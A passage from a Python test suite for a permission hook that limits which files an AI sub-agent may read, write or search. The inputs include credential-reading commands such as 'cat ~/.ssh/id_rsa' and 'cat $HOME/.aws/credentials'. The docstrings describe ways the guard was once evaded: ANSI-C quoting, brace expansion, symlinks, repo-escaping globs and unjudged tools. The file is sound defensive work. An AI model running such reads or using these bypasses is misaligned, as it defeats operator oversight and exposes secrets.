                        "$HOME/.ssh/*", "linkdir/*", "docs/linkdir/*",
                        "docs/linkfile.txt"):
            with self.subTest(pattern), tempfile.TemporaryDirectory() as tmp:
                repo_root = self._make_repo(tmp, manifest=manifest)
                code, body = self._run(
                    repo_root, "Glob", {"path": "docs", "pattern": pattern})
                self.assertEqual(code, 0, f"{pattern} was refused: {body}")

    def test_the_access_log_records_where_an_absolute_pattern_pointed(self) -> None:
        """A pattern-caused refusal must not be filed as a read of the innocent `path`.

        `append_hook_access_log` carries no reason field, so recording `path` filed
        `Glob path=docs` for both `pattern=*.md` and `pattern=/etc/*`. On the ALLOW side
        `path` is where the tool walked — but only for a RELATIVE pattern. An ABSOLUTE one
        ignores `path` entirely (measured), so an ALLOWED `<repo>/spec/*` issued with
        `path=docs` was filed as a read of `docs`: the same conflation, surviving on the
        allow side of the fix that removed it from the block side. All three shapes are
        asserted here, because the two-row version could not see it.
        """
        manifest = {"allowed_read_roots": ["docs", "spec"]}
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest=manifest)
            (repo_root / "spec").mkdir(exist_ok=True)
            rows = {}
            for label, pattern, expected in (
                ("blocked_by_pattern", "/etc/*", 2),
                ("allowed_absolute_elsewhere", f"{repo_root}/spec/*", 0),
                ("allowed_relative", "docs/**/*.md", 0),
            ):
                code, body = self._run(
                    repo_root, "Glob", {"path": "docs", "pattern": pattern})
                self.assertEqual(code, expected, f"{label}: {body}")
                rows[label] = self._log_lines(repo_root)[-1]
        self.assertEqual(rows["blocked_by_pattern"]["decision"], "block")
        self.assertEqual(rows["blocked_by_pattern"]["path"], "/etc")
        self.assertEqual(rows["allowed_absolute_elsewhere"]["decision"], "allow")
        self.assertEqual(rows["allowed_absolute_elsewhere"]["path"], str(repo_root / "spec"))
        self.assertEqual(rows["allowed_relative"]["decision"], "allow")
        self.assertEqual(rows["allowed_relative"]["path"], "docs")

    def test_a_pattern_block_without_a_path_names_one_cause(self) -> None:
        """Two remedies for one refusal are worse than one.

        A pathless `Glob` is validated at the repository root, so with the root granted the
        `path` half passes and the PATTERN is what refuses. The pathless remedy ("pass
        path=…") then fired beside it, producing "its 'path' does grant it" next to "you
        passed no path" — contradictory, and only one names something the leaf can act on.
        """
        manifest = {"allowed_read_roots": ["."]}
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest=manifest)
            code, body = self._run(repo_root, "Glob", {"pattern": "/etc/*"})
        self.assertEqual(code, 2, body)
        self.assertIn("is authorized at", body)
        self.assertNotIn("was called without a 'path'", body)

    def test_the_pattern_remedy_cannot_be_followed_by_half(self) -> None:
        """Half a remedy returns an empty result with no diagnostic anywhere.

        The refusal used to end "drop the leading '/' and pass the directory as 'path'",
        which READS AS TWO OPTIONS. A leaf that does only the first half — `<repo>/spec/*`
        with `path=docs` becomes `spec/*` with `path=docs` — is ALLOWED by this hook (the
        second row asserts it, because that is why the text has to carry the warning: no
        layer below can catch it) and the tool then matches nothing, since a relative
        pattern is anchored at the repository root and the search is confined to `path`.
        Silent empty is the worst answer a read boundary can hand a leaf: it looks like
        "the files are not there", so the leaf reports absence instead of re-issuing.
        """
        manifest = {"allowed_read_roots": ["docs"]}
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest=manifest)
            (repo_root / "spec").mkdir(exist_ok=True)
            code, body = self._run(
                repo_root, "Glob", {"path": "docs", "pattern": f"{repo_root}/spec/*.md"})
            self.assertEqual(code, 2, body)
            self.assertIn("matches nothing SILENTLY", body)
            self.assertIn("BOTH", body)
            half, half_body = self._run(
                repo_root, "Glob", {"path": "docs", "pattern": "spec/*.md"})
        self.assertEqual(half, 0, half_body)

    def test_a_grep_pattern_is_a_content_regex_and_is_not_path_validated(self) -> None:
        """`Grep`'s pattern is content, not a path. Validating it as one would refuse a
        legitimate search for text that happens to look like a path escape — the
        over-refusal direction, and the one this repository keeps making."""
        manifest = {"allowed_read_roots": ["docs"]}
        for pattern in (r"\.\./config", "^/usr/local", "~/.ssh"):
            with self.subTest(pattern), tempfile.TemporaryDirectory() as tmp:
                repo_root = self._make_repo(tmp, manifest=manifest)
                code, body = self._run(
                    repo_root, "Grep", {"path": "docs", "pattern": pattern})
                self.assertEqual(code, 0, f"{pattern} was refused: {body}")

    def test_every_tool_the_leaf_is_launched_with_is_actually_judged(self) -> None:
        """Registering a matcher is not the same as the hook JUDGING the tool.

        `CLAUDE_LEAF_TOOLS` is derived from the `PreToolUse` matcher coverage, and that
        derivation is documented as making it impossible to hand a leaf a tool the hook
        cannot judge. It does not, on its own: `_evaluate_pre_command_file_access_policy`
        returns `None` — which the caller treats as ALLOW — for any tool name it has no
        branch for, and nothing tied the coverage map to the branch set. Measured on the
        unfixed shape: `Monitor`, `WebFetch` and `NotebookEdit` all came back ALLOW under a
        manifest granting `docs` only. So the ordinary-looking edit that grants a leaf a
        new built-in (add it to the coverage map, add a matcher to the committed leaf
        configuration — which is exactly what the config probe checks) would pass preflight
        and the roster check while leaving the tool unvalidated.

        This test is that tie. Each covered tool is DRIVEN with a payload naming a path the
        manifest does not grant and must be refused; the table below must name every
        covered tool and no other, so widening the coverage set fails here until someone
        adds the row — and adding the row means finding the branch that judges it.

        WHAT EACH ROW ESTABLISHES, since the refusals do not all come from the same rule
        (measured by re-running the table with `tools/` GRANTED): `Read`, `Grep` and `Glob`
        discriminate on the read manifest — granted passes, ungranted refuses. `Write` and
        `Edit` refuse on the absent OUTPUT manifest, which is the write boundary's own
        judgement rather than the read one. `Bash` refuses on the rule that forbids reading
        `tools/` directly, which fires even when the manifest grants it. So what the whole
        table pins is that every covered tool reaches SOME judging branch — which is the
        claim the derivation makes — and not that each is judged by the read manifest. An
        earlier version of this docstring said the latter.
        """
        from tools.orchestration_runtime import _CLAUDE_HOOK_MATCHER_COVERAGE

        ungranted = {
            "Read": {"file_path": "tools/secret.py"},
            "Write": {"file_path": "tools/secret.py", "content": "x"},
            "Edit": {"file_path": "tools/secret.py", "old_string": "a", "new_string": "b"},
            "Grep": {"path": "tools", "pattern": "x"},
            "Glob": {"path": "tools", "pattern": "*.py"},
            "Bash": {"command": "cat tools/secret.py"},
        }
        self.assertEqual(set(ungranted), _CLAUDE_HOOK_MATCHER_COVERAGE["PreToolUse"])
        manifest = {"allowed_read_roots": ["docs"]}
        for tool_name, tool_input in sorted(ungranted.items()):
            with self.subTest(tool_name), tempfile.TemporaryDirectory() as tmp:
                repo_root = self._make_repo(tmp, manifest=manifest)
                (repo_root / "tools").mkdir(exist_ok=True)
                (repo_root / "tools" / "secret.py").write_text("x", encoding="utf-8")
                code, body = self._run(repo_root, tool_name, tool_input)
                self.assertEqual(code, 2, f"{tool_name} was not judged: {body}")

    def test_a_tool_outside_the_leaf_allowlist_is_not_judged_by_the_hook(self) -> None:
        """The other half, stated rather than left to be discovered.

        A tool the leaf is NOT launched with falls through to allow — the hook has no
        branch for it. That is safe only because the `--tools` allowlist keeps such a tool
        out of the leaf entirely, which is why the allowlist and the matcher coverage must
        stay the same set. If this ever starts blocking, the hook grew a fail-closed
        default and the sibling test above is no longer the only thing holding the tie.
        """
        manifest = {"allowed_read_roots": ["docs"]}
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest=manifest)
            for tool_name in ("Monitor", "WebFetch", "NotebookEdit"):
                code, _body = self._run(
                    repo_root, tool_name, {"file_path": "tools/secret.py"})
                self.assertEqual(code, 0, tool_name)

    def test_settings_json_registers_grep_and_glob_with_bash_first(self) -> None:
        """Read from the LEAF's settings file, the owner of the hook wiring."""
        from tools.orchestration_runtime import CLAUDE_LEAF_CONFIG_REL
        repo_root = Path(__file__).resolve().parents[2]
        settings_doc = json.loads(
            (repo_root / CLAUDE_LEAF_CONFIG_REL).read_text(encoding="utf-8")
        )
        entries = settings_doc["hooks"]["PreToolUse"]
        matchers = [entry["matcher"] for entry in entries]
        # Other tests index PreToolUse[0] for the Bash hook command.
        self.assertEqual(matchers[0], "Bash")
        self.assertEqual(matchers, ["Bash", "Write", "Edit", "Read", "Grep", "Glob"])
        bash_command = entries[0]["hooks"][0]["command"]
        for entry in entries:
            self.assertEqual(entry["hooks"][0]["command"], bash_command)

    def test_path_under_allowed_root_allows_and_logs(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest={"allowed_read_roots": ["docs/"]})
            code, body = self._run(repo_root, "Grep", {"pattern": "foo", "path": "docs/sub"})
            self.assertEqual(code, 0)
            lines = self._log_lines(repo_root)
            self.assertEqual(len(lines), 1)
            self.assertEqual(lines[0]["decision"], "allow")
            self.assertEqual(lines[0]["tool"], "Grep")
            self.assertEqual(lines[0]["source"], "hook")
            self.assertEqual(lines[0]["path"], "docs/sub")

    def test_path_equal_to_allowed_root_allows(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest={"allowed_read_roots": ["docs/"]})
            code, _ = self._run(repo_root, "Glob", {"pattern": "*.md", "path": "docs"})
            self.assertEqual(code, 0)

    def test_path_outside_allowed_roots_blocks_and_logs(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest={"allowed_read_roots": ["docs/"]})
            code, body = self._run(repo_root, "Grep", {"pattern": "foo", "path": "tools"})
            self.assertEqual(code, 2)
            doc = json.loads(body)
            self.assertEqual(doc.get("decision"), "block")
            self.assertIn("unauthorized read", doc.get("reason", ""))
            lines = self._log_lines(repo_root)
            self.assertEqual(len(lines), 1)
            self.assertEqual(lines[0]["decision"], "block")
            self.assertEqual(lines[0]["policy"], "read_manifest_read_guard")

    def test_missing_path_blocks_with_remediation(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest={"allowed_read_roots": ["docs/"]})
            for tool_name in ("Grep", "Glob"):
                code, body = self._run(repo_root, tool_name, {"pattern": "foo"})
                self.assertEqual(code, 2, msg=tool_name)
                reason = json.loads(body).get("reason", "")
                self.assertIn("unauthorized read", reason)
                self.assertIn("without a 'path'", reason)
                self.assertIn("allowed_read_roots", reason)

    def test_repo_root_manifest_root_allows_pathless_search(self) -> None:
        """A manifest that really grants the repo root is not second-guessed."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest={"allowed_read_roots": ["."]})
            code, _ = self._run(repo_root, "Grep", {"pattern": "foo"})
            self.assertEqual(code, 0)

    def test_non_workflow_mode_allows_without_logging(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest={"allowed_read_roots": ["docs/"]})
            code, _ = self._run(
                repo_root, "Grep", {"pattern": "foo", "path": "tools"}, workflow_mode="0"
            )
            self.assertEqual(code, 0)
            self.assertEqual(self._log_lines(repo_root), [])

    def test_missing_manifest_blocks_fail_closed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest=None)
            code, body = self._run(repo_root, "Glob", {"pattern": "*.md", "path": "docs"})
            self.assertEqual(code, 2)
            self.assertIn("read manifest not found", json.loads(body).get("reason", ""))

    def test_unresolvable_agent_run_id_blocks(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest={"allowed_read_roots": ["docs/"]})
            (
                repo_root
                / "workspace"
                / "orchestrations"
                / self.ORCH
                / "active_child_agent_run_id.txt"
            ).write_text("   ", encoding="utf-8")
            code, body = self._run(repo_root, "Grep", {"pattern": "foo", "path": "docs"})
            self.assertEqual(code, 2)
            reason = json.loads(body).get("reason", "")
            self.assertIn("active child agent_run_id is empty", reason)
            # A blocked SEARCH must not be handed the Edit/Write remediation.
            self.assertIn("allowed_read_roots", reason)
            self.assertNotIn("allowed_file_tool_paths", reason)

    def test_missing_access_log_dir_does_not_change_decision(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(
                tmp, manifest={"allowed_read_roots": ["docs/"]}, access_logs=False
            )
            code, _ = self._run(repo_root, "Grep", {"pattern": "foo", "path": "docs"})
            self.assertEqual(code, 0)
            self.assertEqual(self._log_lines(repo_root), [])


class GlobPatternTriggerSurfaceTests(unittest.TestCase):
    """Every canonical statement of the `Glob` pattern trigger must name every prefix.

    WHY THIS EXISTS. Round 12 narrowed the pattern check to `pattern.startswith(("/",
    "~"))` and every prose statement of the rule was written as "ONLY when it is
    ABSOLUTE". `~` is NOT absolute — that is this branch's own central measurement, the
    reason the tool reads nothing through it — so five documents, including
    `docs/AGENT_CONTRACT.md`, which is the ONLY document a leaf reads, told a leaf that a
    refusal it can actually receive cannot happen. Round 14 corrected the refusal string
    and propagated it to none of them; round 15 found that.

    The rule is defined ONCE, in `tools/hooks/cli.py`, and read from there: the members of
    the trigger tuple are extracted from the source and every surface must name each one.
    Add a prefix to the trigger and this fails until the documents say so, which is the
    only mechanism on this branch that couples them.
    """

    _REPO_ROOT = Path(__file__).resolve().parents[2]
    _WINDOW = 300

    # (file, anchor for the sentence that states the trigger). The anchor is not the
    # whole line: `docs/HOOKS.md` line 14 states this rule and the `Grep`-is-not-validated
    # rule on one line, and only the first names the prefixes.
    _SURFACES = (
        ("tools/hooks/cli.py", "NAMES PATHS and is validated too"),
        # Anchored on text that PRECEDES the rule and is identical in the wording this
        # check was written to refuse, so a failure reads "the statement does not name
        # `~`" rather than "the sentence I wrote is gone" — an anchor taken from the
        # corrected wording would only pin that the correction is still there.
        ("docs/AGENT_CONTRACT.md", "finds nothing — use `path=`"),
        ("docs/HOOKS.md", "is validated too"),
        ("docs/ORCHESTRATION.md", "a `Glob` `pattern` too"),
        ("TODO.md", "The check refuses"),
    )

    @classmethod
    def _trigger_prefixes(cls) -> tuple[str, ...]:
        """The literal prefixes the hook refuses on, read out of the hook's source.

        A NAMED CONSTANT is resolved rather than refused. The first version matched only
        `pattern.startswith((...))` with the tuple inline, so extracting it to
        `_PREFIXES = ("/", "~")` — a refactor that changes nothing — raised its assertion
        and turned a set of true documents red, with a message naming no repair. That is
        an over-refusal on correct work, and this class is the exemplar
        `metforge-enforcement-change` rule 3-a tells a reader to copy, so the flaw would have
        been copied with it.
        """
        source = (cls._REPO_ROOT / "tools" / "hooks" / "cli.py").read_text(encoding="utf-8")
        match = re.search(r"pattern\.startswith\(\s*\(([^)]*)\)\s*\)", source)
        if match is None:
            named = re.search(r"pattern\.startswith\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)", source)
            assert named is not None, (
                "the pattern trigger is neither an inline tuple nor a named constant; "
                "point this reader at wherever the prefixes now live")
            definition = re.search(
                rf"^{named.group(1)}\s*(?::[^=]+)?=\s*\(([^)]*)\)", source, re.M)
            assert definition is not None, (
                f"the trigger names {named.group(1)}, which is not defined as a literal "
                "tuple in this module; read it from wherever it is defined")
            match = definition
        return tuple(re.findall(r'"([^"]*)"', match.group(1)))

    @classmethod
    def _statements(cls, text: str, anchor: str) -> list[str]:
        """`_WINDOW` characters from each anchor, joined with the next line.

        Joined because both the `cli.py` comment and the reflowed Markdown put the
        second prefix on the line after the first.
        """
        out: list[str] = []
        lines = text.splitlines()
        for n, line in enumerate(lines):
            if anchor not in line:
                continue
            joined = " ".join([line] + lines[n + 1 : n + 2])
            i = joined.index(anchor)
            out.append(joined[i : i + cls._WINDOW])
        return out

    def test_the_trigger_is_the_two_measured_prefixes(self) -> None:
        """A change to the trigger must be deliberate, and must reach the documents.

        Pinned as a SET rather than a behaviour because the behavioural witnesses
        (`test_an_absolute_or_tilde_glob_pattern_is_blocked` and its relative twin)
        cannot tell "a prefix was added" from "a prefix was added and documented".
        """
        self.assertEqual(self._trigger_prefixes(), ("/", "~"))

    def test_every_canonical_statement_names_every_prefix(self) -> None:
        prefixes = self._trigger_prefixes()
        for rel, anchor in self._SURFACES:
            text = (self._REPO_ROOT / rel).read_text(encoding="utf-8")
            statements = self._statements(text, anchor)
            self.assertTrue(statements, f"{rel}: anchor {anchor!r} not found")
            for statement in statements:
                for prefix in prefixes:
                    self.assertIn(
                        f"`{prefix}`",
                        statement,
                        f"{rel}: a statement of the pattern rule does not name "
                        f"`{prefix}`, which the hook refuses on: {statement!r}",
                    )

    def test_the_statement_reader_is_bounded(self) -> None:
        """SELF-TEST. Without it the window could be the whole file and nothing notice.

        A document that names the second prefix far away from the rule it states is the
        exact shape the check exists to refuse — `docs/HOOKS.md` names `~` several times
        in its MEASUREMENT list while the RULE sentence beside it said "absolute".
        """
        anchor = "is validated too"
        near = f"{anchor} when it begins with `/` or `~`."
        far = f"{anchor} when it is absolute." + " padding" * 80 + " `~`"
        self.assertTrue(all("`~`" in s for s in self._statements(near, anchor)))
        self.assertFalse(all("`~`" in s for s in self._statements(far, anchor)))


class BashReadManifestGuardTests(unittest.TestCase):
    """Bash read targets are authorized before the read-only auto-approve."""

    ORCH = "orch_bash_read_001"
    RUN_ID = "child_run_bash_read_001"

    def _make_repo(self, tmp: str, *, roots: list[str] | None) -> Path:
        repo_root = Path(tmp)
        orch_root = repo_root / "workspace" / "orchestrations" / self.ORCH
        (orch_root / "read_manifests").mkdir(parents=True, exist_ok=True)
        (orch_root / "access_logs").mkdir(parents=True, exist_ok=True)
        (orch_root / "active_child_agent_run_id.txt").write_text(self.RUN_ID, encoding="utf-8")
        if roots is not None:
            (orch_root / "read_manifests" / f"{self.RUN_ID}.json").write_text(
                json.dumps({"allowed_read_roots": roots}), encoding="utf-8"
            )
        (repo_root / "docs").mkdir(parents=True, exist_ok=True)
        (repo_root / "docs" / "WORKFLOW.md").write_text("x", encoding="utf-8")
        # NOT under tools/: forbid_tools_direct_read would fire first and
        # this suite is about the read-manifest guard.
        (repo_root / "spec").mkdir(parents=True, exist_ok=True)
        (repo_root / "spec" / "private.md").write_text("x", encoding="utf-8")
        return repo_root

    def _run(self, repo_root: Path, command: str, *, workflow_mode: str = "1"):
        payload = {
            "orchestration_id": self.ORCH,
            "repo_root": str(repo_root),
            "tool_name": "Bash",
            "tool_input": {"command": command},
        }
        out = io.StringIO()
        with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": workflow_mode}, clear=False):
            with redirect_stdout(out):
                code = cli.main(
                    [
                        "--backend",
                        "claude",
                        "--event",
                        "PreToolUse",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
        return code, out.getvalue().strip()

    def _log_lines(self, repo_root: Path) -> list[dict]:
        log_path = (
            repo_root
            / "workspace"
            / "orchestrations"
            / self.ORCH
            / "access_logs"
            / f"{self.RUN_ID}.jsonl"
        )
        if not log_path.is_file():
            return []
        return [
            json.loads(line)
            for line in log_path.read_text(encoding="utf-8").splitlines()
            if line.strip()
        ]

    def test_out_of_manifest_read_blocks_an_otherwise_auto_approvable_command(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, body = self._run(repo_root, "true && cat spec/private.md")
            self.assertEqual(code, 2)
            doc = json.loads(body)
            self.assertEqual(doc.get("decision"), "block")
            reason = doc.get("reason", "")
            self.assertIn("unauthorized read", reason)
            self.assertIn("Bash command reads 'spec/private.md'", reason)
            self.assertIn("allowed_read_roots", reason)
            lines = self._log_lines(repo_root)
            self.assertEqual(len(lines), 1)
            self.assertEqual(lines[0]["decision"], "block")
            self.assertEqual(lines[0]["tool"], "Bash")
            self.assertEqual(lines[0]["policy"], "read_manifest_read_guard")

    def test_in_manifest_read_still_auto_approves(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, body = self._run(repo_root, "true && cat docs/WORKFLOW.md")
            self.assertEqual(code, 0)
            doc = json.loads(body)
            self.assertEqual(
                doc.get("hookSpecificOutput", {}).get("permissionDecision"), "allow"
            )
            lines = self._log_lines(repo_root)
            self.assertEqual([entry["decision"] for entry in lines], ["allow"])

    def test_nonexistent_target_is_not_blocked(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, _ = self._run(repo_root, "cat spec/does_not_exist.md")
            self.assertEqual(code, 0)
            self.assertEqual(self._log_lines(repo_root), [])

    def test_out_of_repo_target_is_not_blocked(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, _ = self._run(repo_root, "cat /dev/null")
            self.assertEqual(code, 0)
            self.assertEqual(self._log_lines(repo_root), [])

    def test_out_of_repo_target_is_withheld_from_auto_approve(self) -> None:
        """Not blocked, but not auto-approved either.

        Auto-approval bypasses the harness permission list; the repo-relative
        manifest authorized nothing here, so that list must stay in charge. The
        in-repo twin is auto-approved, which is what makes this a real
        distinction rather than a dead branch.
        """
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            for command in (
                "cat /etc/hostname",
                "cat /etc/*.conf",
                # `~` / `$HOME` spellings: `_resolve_target_path` is literal, so
                # these used to read as the in-repo path `<repo>/~/...`, miss as
                # "nonexistent", and land in the auto-approve.
                "cat ~/.ssh/id_rsa",
                "cat ~/.ssh/*",
                "cat $HOME/.aws/credentials",
                # An unquoted `$` makes the target unprovable at all: the
                # extractor declares `$VAR` operands as residue it cannot see.
                "cat $SOMEVAR/x",
                # ANSI-C quoting: `$'\057etc'` is `/etc`, and the `$` check
                # exempts `$` before a quote unless it is spelled for it.
                "cat $'\\057etc\\057hostname'",
                # A brace expansion mixing an in-repo and an out-of-repo variant
                # is the shape only `_expanded_target_path` decides: the `~` word
                # check does not see it, because the token starts with `{`.
                "cat {~/.ssh/id_rsa,docs/WORKFLOW.md}",
            ):
                code, body = self._run(repo_root, command)
                self.assertEqual(code, 0, msg=command)
                # A plain allow emits no envelope at all; only the auto-approve
                # writes permissionDecision=allow.
                decision = (
                    json.loads(body).get("hookSpecificOutput", {}).get("permissionDecision")
                    if body
                    else None
                )
                self.assertNotEqual(decision, "allow", msg=command)
            for command in (
                "cat docs/WORKFLOW.md",
                "true && cat docs/WORKFLOW.md",
                "cat docs/*.md",
                # `/dev/null` is out-of-repo but reads nothing, and
                # `diff -u /dev/null <file>` is a common real shape.
                "diff -u /dev/null docs/WORKFLOW.md",
            ):
                code, body = self._run(repo_root, command)
                self.assertEqual(code, 0, msg=command)
                self.assertEqual(
                    json.loads(body).get("hookSpecificOutput", {}).get("permissionDecision"),
                    "allow",
                    msg=command,
                )

    def test_quoted_variable_reads_are_withheld_from_auto_approve(self) -> None:
        """bash expands `$HOME` inside double quotes.

        Testing the quote-STRIPPED copy let `cat "$HOME/.aws/credentials"`
        through while rejecting the identical unquoted read — the target is
        equally invisible to `extract_bash_read_targets` in both spellings.
        """
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            for command in (
                'cat "$HOME/.aws/credentials"',
                'cat "$HOME"/.ssh/id_rsa',
                'cat "${HOME}/.ssh/id_rsa"',
                'grep x "$HOME/.aws/credentials"',
                "cat ~-/.ssh/id_rsa",
                "ls -la ~",
            ):
                code, body = self._run(repo_root, command)
                self.assertEqual(code, 0, msg=command)
                decision = (
                    json.loads(body).get("hookSpecificOutput", {}).get("permissionDecision")
                    if body
                    else None
                )
                self.assertNotEqual(decision, "allow", msg=command)
            # A `$` that names no path keeps its auto-approve: a regex anchor,
            # `$?`, `$$`. Withholding those would be pure friction.
            for command in (
                'grep -n "foo$" docs/WORKFLOW.md',
                # A regex anchor in a SINGLE-quoted word: here `$'` closes a word
                # rather than opening one, and treating it as ANSI-C quoting cost
                # four real commands their auto-approve.
                "grep -n 'foo$' docs/WORKFLOW.md",
                r"cat docs/WORKFLOW.md | grep -n '^\$'",
                'echo "EXIT:$?"',
                r'grep -E "\.(py|md)$" docs/WORKFLOW.md',
            ):
                code, body = self._run(repo_root, command)
                self.assertEqual(code, 0, msg=command)
                self.assertEqual(
                    json.loads(body).get("hookSpecificOutput", {}).get("permissionDecision"),
                    "allow",
                    msg=command)

    def test_symlinked_glob_match_is_withheld_like_its_literal_twin(self) -> None:
        """`cat docs/link.txt` and `cat docs/*.txt` must agree.

        Containment was decided on the UNRESOLVED match, so an in-repo symlink
        pointing outside was classified in-repo — the glob form authorized
        against the repo-relative manifest what the literal form withheld.
        """
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(Path(tmp) / "repo", roots=["docs/"])
            (Path(tmp) / "outside.txt").write_text("secret", encoding="utf-8")
            os.symlink(Path(tmp) / "outside.txt", repo_root / "docs" / "link.txt")
            for command in ("cat docs/link.txt", "cat docs/*.txt"):
                code, body = self._run(repo_root, command)
                self.assertEqual(code, 0, msg=command)
                decision = (
                    json.loads(body).get("hookSpecificOutput", {}).get("permissionDecision")
                    if body
                    else None
                )
                self.assertNotEqual(decision, "allow", msg=command)

    def test_glob_escaping_the_repo_is_withheld_from_auto_approve(self) -> None:
        """A glob whose PREFIX is in-repo can still match outside it.

        `docs/*/../../outside.txt` expands to a real out-of-repo file; the
        expanded matches were dropped silently, so the command reached the
        auto-approve with nothing having authorized the path.
        """
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(Path(tmp) / "repo", roots=["docs/"])
            (repo_root / "docs" / "sub").mkdir(parents=True, exist_ok=True)
            (Path(tmp) / "outside.txt").write_text("secret", encoding="utf-8")
            code, body = self._run(repo_root, "cat docs/*/../../../outside.txt")
            self.assertEqual(code, 0)
            decision = (
                json.loads(body).get("hookSpecificOutput", {}).get("permissionDecision")
                if body
                else None
            )
            self.assertNotEqual(decision, "allow")

    def test_read_tool_parity_on_backend_credential_home(self) -> None:
        """Parity: the Read tool never reached these paths, and still does not.

        allowed_read_roots is repo-relative, so an absolute home path can never
        be in it — this pins the property the Bash guard was closing the gap to.
        """
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            for target in (
                str(Path.home() / ".claude.json"),
                str(Path.home() / ".claude" / "settings.json"),
                str(Path.home() / ".codex" / "auth.json"),
                str(Path.home() / ".met-forge" / "operator_tokens" / "x.txt"),
            ):
                payload = {
                    "orchestration_id": self.ORCH,
                    "repo_root": str(repo_root),
                    "tool_name": "Read",
                    "tool_input": {"file_path": target},
                }
                out = io.StringIO()
                with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": "1"}, clear=False):
                    with redirect_stdout(out):
                        code = cli.main(
                            [
                                "--backend",
                                "claude",
                                "--event",
                                "PreToolUse",
                                "--input-json",
                                json.dumps(payload),
                            ]
                        )
                self.assertEqual(code, 2, msg=target)
                # Pin the REASON, not just the exit code: a block for an
                # unrelated future reason would satisfy the code alone.
                self.assertIn(
                    "read_manifest allowed_read_roots", json.loads(out.getvalue()).get("reason", ""),
                    msg=target)

    def test_backend_credential_read_blocks_before_auto_approve(self) -> None:
        """The one path that must not merely lose the auto-approve, but block."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            for command in ("cat ~/.claude.json", "cat ~/.claude/settings.json"):
                code, body = self._run(repo_root, command)
                self.assertEqual(code, 2, msg=command)
                self.assertIn("backend CLI's credential", json.loads(body).get("reason", ""))

    def test_failed_cd_does_not_disarm_the_guard(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, body = self._run(repo_root, "cd nosuchdir; cat spec/private.md")
            self.assertEqual(code, 2)
            self.assertIn("'spec/private.md'", json.loads(body).get("reason", ""))

    def test_cd_prefixed_read_still_blocks(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, body = self._run(repo_root, "cd spec && cat private.md")
            self.assertEqual(code, 2)
            self.assertIn("'spec/private.md'", json.loads(body).get("reason", ""))
            # And the in-manifest equivalent still passes.
            self.assertEqual(self._run(repo_root, "cd docs && cat WORKFLOW.md")[0], 0)

    def test_unprovable_residue_is_not_blocked(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, _ = self._run(repo_root, "echo spec/private.md | xargs cat")
            self.assertEqual(code, 0)
            self.assertEqual(self._log_lines(repo_root), [])

    def test_glob_target_is_expanded_not_dropped(self) -> None:
        """`cat spec/*.md` names real files: dropping the pattern as "nonexistent"
        would hand it to the read-only auto-approve untouched."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, body = self._run(repo_root, "cat spec/*.md")
            self.assertEqual(code, 2)
            reason = json.loads(body).get("reason", "")
            # The block names the matched file, not the pattern.
            self.assertIn("'spec/private.md'", reason)
            self.assertEqual(
                [entry["path"] for entry in self._log_lines(repo_root)], ["spec/private.md"]
            )

    def test_in_manifest_glob_still_allowed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, _ = self._run(repo_root, "cat docs/*.md")
            self.assertEqual(code, 0)
            self.assertEqual([e["decision"] for e in self._log_lines(repo_root)], ["allow"])

    def test_brace_expansion_target_is_expanded_not_dropped(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            (repo_root / "spec" / "private2.md").write_text("x", encoding="utf-8")
            code, body = self._run(repo_root, "cat spec/{private,private2}.md")
            self.assertEqual(code, 2)
            self.assertIn("'spec/private.md'", json.loads(body).get("reason", ""))
            # A range is as lexical as a comma group, and reaches real files.
            (repo_root / "spec" / "p1.md").write_text("x", encoding="utf-8")
            (repo_root / "spec" / "p2.md").write_text("x", encoding="utf-8")
            self.assertEqual(self._run(repo_root, "cat spec/p{1..2}.md")[0], 2)

